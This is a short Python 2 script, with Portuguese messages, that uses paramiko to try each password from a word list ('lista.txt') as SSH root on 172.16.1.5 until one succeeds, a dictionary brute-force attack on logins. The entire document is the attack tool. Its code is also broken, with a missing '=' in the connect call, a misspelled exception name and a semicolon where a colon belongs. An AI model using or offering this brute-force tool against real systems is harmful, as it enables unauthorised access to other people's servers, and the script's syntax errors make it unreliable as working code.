#!/usr/bin/python
import paramiko

ssh = paramiko.SSHClient()

ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

f = open("lista.txt")
for line in f.readlines():

	senha = line.split()

	try:
		ssh.connect("172.16.1.5",username"root", password=senha[0])

	except paramiko.AuthenticationExeption;

		print "Acesso Negado",line
	else:
		print "[+]- Senha encontrada [+]"
		break
ssh.close()
